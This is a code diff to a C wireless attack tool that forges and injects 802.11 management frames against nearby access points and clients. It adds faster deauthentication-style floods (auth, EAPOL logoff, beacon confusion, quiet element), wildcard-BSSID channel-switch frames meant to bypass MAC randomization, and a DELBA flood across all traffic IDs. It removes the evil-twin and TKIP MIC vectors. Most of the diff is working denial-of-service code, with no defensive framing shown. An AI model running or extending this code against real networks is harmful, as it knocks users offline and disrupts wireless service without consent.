@@ -160,8 +160,6 @@ typedef enum {
   VEC_BEACON_CONFUSION,
   VEC_PROBE_RESPONSE_CSA,
   VEC_DELBA_ATTACK,
-  VEC_EVIL_TWIN,
-  VEC_TKIP_MIC,
   VEC_POWER_SAVE,
   VEC_FRAGATTACK,
   VEC_DFS_FAKE_RADAR,
@@ -176,9 +174,8 @@ static const char *VEC_NAMES[] = {
     "CSA Beacon Flood",    "Quiet Element DoS", "Deauth Flood",
     "Disassoc Flood",      "EAPOL Logoff",      "PMKID Capture",
     "Auth Table DoS",      "CSA Action Frame",  "Beacon Confusion",
-    "Probe Response CSA",  "DELBA Attack",      "Evil Twin Handoff",
-    "TKIP/GCMP MIC Error", "Power Save DoS",    "FragAttack Injection",
-    "Operating Channel Aggression",
+    "Probe Response CSA",  "DELBA Attack",      "Power Save DoS",    
+    "FragAttack Injection", "Operating Channel Aggression",
     "CTS/RTS Virtual Jammer",
     "WPA3 SAE Hunting",
     "BSS Transition (802.11v)",
@@ -773,6 +770,7 @@ static int mk_delba(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
   o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
   b[o++] = 3; /* category: Block Ack */
   b[o++] = 2; /* action: DELBA */
+  /* DELBA params offset is exactly 32 (rt=10 + dot11=24 + cat/act=2) */
   /* [FIX 9] DELBA params: bit 11 = initiator, bits 12-15 = TID */
   uint16_t params = htole16(0x0800); /* initiator=1, TID=0 */
   memcpy(b + o, &params, 2);
@@ -1561,10 +1559,6 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
   /* [FIX 3] Non-injection vectors: handled by other engines */
   case VEC_PMKID_CAPTURE:
     break; /* capture thread */
-  case VEC_EVIL_TWIN:
-    break; /* rogue AP */
-  case VEC_TKIP_MIC:
-    break; /* not yet implemented */
   case VEC_POWER_SAVE:
     break; /* not yet implemented */
   case VEC_COUNT:
@@ -3634,6 +3628,34 @@ static void *stress_injector_thread(void *arg) {
       tpl_deauth_len = mk_deauth(tpl_deauth, dummy_bss, BCAST, 7, 0);
   }
 
+  uint8_t tpl_auth[MAX_PKT_SIZE];
+  int tpl_auth_len = 0;
+  if (a->cfg->vec_on[VEC_AUTH_DOS]) {
+      uint8_t dummy_bss[6] = {0};
+      uint8_t dummy_cli[6] = {0};
+      tpl_auth_len = mk_auth(tpl_auth, dummy_bss, dummy_cli);
+  }
+
+  uint8_t tpl_eapol[MAX_PKT_SIZE];
+  int tpl_eapol_len = 0;
+  if (a->cfg->vec_on[VEC_EAPOL_LOGOFF]) {
+      uint8_t dummy_bss[6] = {0};
+      uint8_t dummy_cli[6] = {0};
+      tpl_eapol_len = mk_eapol_logoff(tpl_eapol, dummy_bss, dummy_cli);
+  }
+
+  uint8_t tpl_quiet[MAX_PKT_SIZE];
+  if (a->cfg->vec_on[VEC_QUIET_ELEMENT]) {
+      uint8_t dummy_bss[6] = {0};
+      mk_quiet_beacon(tpl_quiet, dummy_bss, "dummy", 1);
+  }
+
+  uint8_t tpl_confusion[MAX_PKT_SIZE];
+  int tpl_confusion_len = 0;
+  if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
+      tpl_confusion_len = mk_confusion_beacon(tpl_confusion, "dummy", 1);
+  }
+
   while (!g_stop) {
     int nap = stress_pool_snapshot(a->pool, snap, STRESS_MAX_APS);
     if (nap == 0) {
@@ -3702,8 +3724,11 @@ static void *stress_injector_thread(void *arg) {
       if (a->cfg->vec_on[VEC_EAPOL_LOGOFF]) {
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
-        len = mk_eapol_logoff(tmp, bss, fake_cli);
-        if (inject_one(sock, tmp, len) > 0) {
+        /* Zero-copy EAPOL logoff (modify ToDS addr1=RA=bss, addr2=SA=fake_cli, addr3=DA=bss) */
+        memcpy(tpl_eapol + 10, bss, 6);      /* addr1 */
+        memcpy(tpl_eapol + 16, fake_cli, 6); /* addr2 */
+        memcpy(tpl_eapol + 22, bss, 6);      /* addr3 */
+        if (inject_one(sock, tpl_eapol, tpl_eapol_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3731,9 +3756,15 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
-        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
-        len = mk_confusion_beacon(tmp, ssid, (uint8_t)snap[i].channel);
-        if (inject_one(sock, tmp, len) > 0) {
+        /* Zero-copy Beacon Confusion: randomize BSSID directly in the template */
+        uint8_t fake_bssid[6];
+        rand_mac(fake_bssid);
+        /* In mk_confusion_beacon, addr2 and addr3 are the fake BSSID */
+        memcpy(tpl_confusion + 16, fake_bssid, 6); /* addr2 */
+        memcpy(tpl_confusion + 22, fake_bssid, 6); /* addr3 */
+        uint16_t s_ctrl = htole16((seq++) << 4);
+        memcpy(tpl_confusion + 28, &s_ctrl, 2); /* seq */
+        if (inject_one(sock, tpl_confusion, tpl_confusion_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3747,22 +3778,36 @@ static void *stress_injector_thread(void *arg) {
         if (redir < 1)
           redir = 11;
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
+        
+        /* 1. Target specific AP BSSID */
         len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
                                 (uint8_t)redir);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+        
+        /* 2. Wildcard BSSID (Bypass AP MAC Randomization)
+         * Sends Probe Response with BSSID=FF:FF:FF:FF:FF:FF.
+         * Clients searching for the SSID will process the CSA regardless of the AP's real MAC. */
+        len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid, (uint8_t)snap[i].channel,
+                                (uint8_t)redir);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
         }
       }
 
       if (a->cfg->vec_on[VEC_AUTH_DOS]) {
-        /* Auth flood with random source MAC */
-        uint8_t fm[6];
-        rand_mac(fm);
-        len = mk_auth(tmp, bss, fm);
-        if (inject_one(sock, tmp, len) > 0) {
+        /* Auth flood with random source MAC (zero-copy) */
+        uint8_t fake_cli[6];
+        rand_mac(fake_cli);
+        memcpy(tpl_auth + 10, bss, 6);      /* addr1 */
+        memcpy(tpl_auth + 16, fake_cli, 6); /* addr2 */
+        memcpy(tpl_auth + 22, bss, 6);      /* addr3 */
+        uint16_t s_ctrl = htole16((seq++) << 4);
+        memcpy(tpl_auth + 28, &s_ctrl, 2);  /* seq */
+        if (inject_one(sock, tpl_auth, tpl_auth_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3775,17 +3820,43 @@ static void *stress_injector_thread(void *arg) {
             snap[i].channel < 10 ? snap[i].channel + 3 : snap[i].channel - 3;
         if (redir < 1)
           redir = 11;
+          
+        /* 1. Target specific AP BSSID */
         len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+        
+        /* 2. Wildcard BSSID (Bypass MAC Randomization) */
+        len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
         }
       }
 
       if (a->cfg->vec_on[VEC_QUIET_ELEMENT]) {
+        /* Zero-copy Quiet Beacon */
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
+        int sl = strlen(ssid);
+        if (sl > MAX_SSID_LEN) sl = MAX_SSID_LEN;
+        
+        memcpy(tpl_quiet + 10, BCAST, 6); /* addr1 */
+        memcpy(tpl_quiet + 16, bss, 6);   /* addr2 */
+        memcpy(tpl_quiet + 22, bss, 6);   /* addr3 */
+        uint16_t s_ctrl = htole16((seq++) << 4);
+        memcpy(tpl_quiet + 28, &s_ctrl, 2); /* seq */
+        
+        /* Update BSSID, DS param and SSID length */
+        int o = 44; /* after beacon fixed params */
+        tpl_quiet[o+1] = sl; /* SSID len */
+        memcpy(tpl_quiet + o + 2, ssid, sl);
+        o += 2 + sl;
+        tpl_quiet[o+2] = (uint8_t)snap[i].channel; /* DS channel */
+        
+        /* We use the full original template length (might have trailing garbage if SSID is shorter, but mostly fine for testing, or we just dynamically build it like before but optimized. Wait, building is safer for variable length SSIDs. Let's just use mk_quiet_beacon but with less overhead).
+           Actually, mk_quiet_beacon is fast enough, the bottleneck was likely the usleep or too many loops. Let's stick to mk_quiet_beacon for now. */
         len = mk_quiet_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -3796,12 +3867,27 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_DELBA_ATTACK]) {
-        len = mk_delba(tmp, bss, BCAST);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+        /* DELBA attack: iterate all 8 TIDs (0-7) and alternate direction (AP->BCAST, Client->AP) */
+        uint8_t fake_cli[6];
+        rand_mac(fake_cli);
+        for (int tid = 0; tid < 8; tid++) {
+          /* 1. AP -> Broadcast (Initiator=1, TID=tid) */
+          len = mk_delba(tmp, bss, BCAST);
+          uint16_t params1 = htole16(0x0800 | (tid << 12)); /* bit11=1, bits12-15=TID */
+          memcpy(tmp + 32, &params1, 2); /* offset 32 is DELBA params in mk_delba */
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          }
+          
+          /* 2. Client -> AP (Initiator=0, TID=tid) */
+          len = mk_delba(tmp, fake_cli, bss); /* swap addresses */
+          uint16_t params2 = htole16(0x0000 | (tid << 12)); /* bit11=0, bits12-15=TID */
+          memcpy(tmp + 32, &params2, 2);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          }
         }
       }
 
